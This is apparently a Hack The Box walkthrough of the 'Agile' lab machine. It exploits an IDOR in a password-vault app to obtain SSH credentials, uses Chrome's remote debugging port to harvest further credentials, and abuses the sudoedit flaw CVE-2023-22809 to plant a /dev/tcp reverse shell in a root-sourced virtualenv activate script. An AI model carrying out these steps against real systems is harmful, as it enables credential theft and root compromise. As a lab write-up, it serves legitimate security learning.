# Agile(Medium) HTB - Open Beta Season 
## IP = 10.129.171.194

### NMAP

```
PORT   STATE SERVICE VERSION                                                                                                        
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)                                 
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)                               
80/tcp open  http    nginx 1.18.0 (Ubuntu)                                       
|_http-title: Did not follow redirect to http://superpass.htb                    
|_http-server-header: nginx/1.18.0 (Ubuntu)                                      
| http-methods:               
|_  Supported Methods: GET HEAD POST OPTIONS                                     
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Enumeration

Looking around the place I started looking for interesting things, first the login page, after trying some passwords and sqli payloads I decided to register, after registration you can see the vault page, in the vault page there is a form for you to enter your sites credentials, after entering those credentials you can export it to a CSV file. After searching for csv exploits and not succeeding a bit, I checked all functionalities(clicked all the buttons, entered all input, etc.) with BurpSuite and finally something caught my eye. 


<img src="captures/1edit_row.png" />


When clicking the "edit button" and intercepting it, you can see that it activate this /vault/edit_row/10 this looks like it is editing the 10th row meaning there are other rows that we can maybe find and there is a high probability that there is some sort of IDOR(Insecure direct object references).

After sending this request to the repeater we can know try and decrease the numbers from 10 to 9 and etc. to find maybe there is a row which is visible by us and has interesting data.


<img src='captures/2edit_row8.png' />


As you can see when checking for /vault/edit_row/8 we can see something we did not see before which is the issued get request, up until now we only saw the post one but now another one just got add: "/vault/row/8". Sow lets enter it and see whats going on there.

`agile corum 5db7caa1d13cc37c9fc2`


So that looks interesting, if you remember the format of the vault it, should be: site,username,password. So lets try and SSH in. 


### SSH Login

```
$ ssh corum@superpass.htb
corum@superpass.htb's password: 5db7caa1d13cc37c9fc2
corum@agile:~$ whoami && id && cat user.txt 
corum
uid=1000(corum) gid=1000(corum) groups=1000(corum)
0ffb0a28953dcc02b67bcf99b95f9bbf
```

### PrivEsc

#### Switch to Edward


So, after running `pspy` you can see the a command that is running a lot, and it is the following: 

`/opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=28258 --l
ang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-
input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --
renderer-client-id=5 --time-ticks-at-unix-epoch=-1678186636007265 --launch-time-ticks=24466562272 --shared-files=v8_context_snapshot
_data:100 --field-trial-handle=0,i,453033962858864317,15047474094187127091,131072 --disable-features=PaintHolding`

this is a this is a command line instruction for running a headless instance of the Google Chrome web browser and the interesting here is `--remote-debugging-port=41829` this flag specifies the port for remote debugging of chrome. This is classic Port Forwarding. So you need to do the following to forward the port to your host:

`$ ssh corum@superpass.htb -L localhost:9999:superpass.htb:41829`

this instruction forward the 41829 port to our localhost in as port 9999. after running that open chrome and enter the following: `chrome://inspect`. Now configure the "Discover network targets" and add the following: `localhost:9999` and enable port forwarding. Now you want to wait, after a little bit a "Remote Target" should appear, you should see http://test.superpass.htb/ when clicking inspect it will open the devtools, navigate the vault again and you'll see edwards creds. 

<img src="captures/3edward-creds.png" />


Now `su` to edwards.
Password: d07867c6267dcb5df0af

When running `sudo -l` the following output appears:

```
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

You can see that you can edit those two files as dev_admin with sudoedit. If you search for exploits on sudoedit you'll see a new CVE-2023-22809. The exploit was created because sudoedit(sudo -e) mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value. 

So we need to think how to use this exploit as the 'dev_admin' user because we can't run it as root so root only files are not an option.

When running the following command: `$ EDITOR="vim -- /app/config_prod.json" sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt` you can read the config_prod.json file you can see the mysql credentials. 

```
config_prod.json:
{
    "SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"
}
```



```

edwards@agile:~$ mysql -h localhost -u superpassuser -p superpass
Password: dSA6l7q*yIVs$39Ml6ywvgK

```

<img src="captures/4mysql.png" />


After a while I understood that this is a rabbit hole and cracking those passwords will take days, so I started looking for other things. So I started looking for some crons that root is running and found out an interesting file that root loads to the shell the file: `/app/venv/bin/activate`, now why is it interesting? well I when looking at the venv directory we can see that "dev_admin" is a part of it, meaning we can use that active file with the exploit we found with `sudoedit` to add a reverse shell command and we'll probably get root.

The following is the command run by root:
<img src="captures/5pspy.png" />


```

edwards@agile:/app/venv/bin$ ls -la activate
-rw-rw-r-- 1 root dev_admin 1976 Mar 11 13:42 activate

```
As you can see this file can be writable by "dev_admin".


`edwards@agile:/app/venv/bin$ EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt`


<img src="captures/6activate.png" />



```

$ nc -lvnp 9037              
listening on [any] 9037 ...                                                                                  
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.203] 54408                                                    
bash: cannot set terminal process group (217931): Inappropriate ioctl for device                               
bash: no job control in this shell                                                                            
bash: connect: Connection refused 
bash: /dev/tcp/10.10.14.17/9037: Connection refused                               
bash: /app/venv/bin/activate: line 70: syntax error near unexpected token `fi' 
bash: /app/venv/bin/activate: line 70: `fi' 

root@agile:~# whoami && id && cat root.txt
root
uid=0(root) gid=0(root) groups=0(root)
3109ec7cce6dcb7278d0c9d726f213e9

```

